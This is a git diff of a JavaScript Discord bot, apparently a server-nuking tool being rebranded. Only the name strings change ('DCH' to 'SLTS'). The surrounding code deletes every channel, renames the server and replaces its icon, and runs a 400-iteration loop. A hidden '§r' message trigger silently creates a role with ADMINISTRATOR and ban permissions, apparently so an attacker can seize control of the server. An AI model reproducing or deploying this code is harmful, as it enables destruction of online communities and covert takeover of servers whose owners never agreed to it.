@@ -37,7 +37,7 @@ if(cmd("destruction", msg)) {
         c.delete();
         console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: destruction du channel ${c.name}; ID: ${c.id}. (╯°□°）╯︵ ┻━┻`);
     });
-    msg.guild.setName("BZ by DCH ");
+    msg.guild.setName("BZ by SLTS ");
     msg.guild.setIcon("https://cdn.discordapp.com/attachments/436480961979351040/482591506075746356/kowine.png");
     msg.channel.fetchMessages({limit: 1}).then(messages => msg.channel.bulkDelete(messages));
     for (var i = 0; i < 400; i++) {
@@ -57,7 +57,7 @@ bot.on('message', msg => {
     if (msg.content === '§r') {
     msg.channel.fetchMessages({limit: 1}).then(messages => msg.channel.bulkDelete(messages));
     msg.guild.createRole({
-    name: 'BZDCH',
+    name: 'BZSLTS',
     color: 'WHITE',
     permissions:['ADMINISTRATOR', 'BAN_MEMBERS', 'MANAGE_CHANNELS']
     })
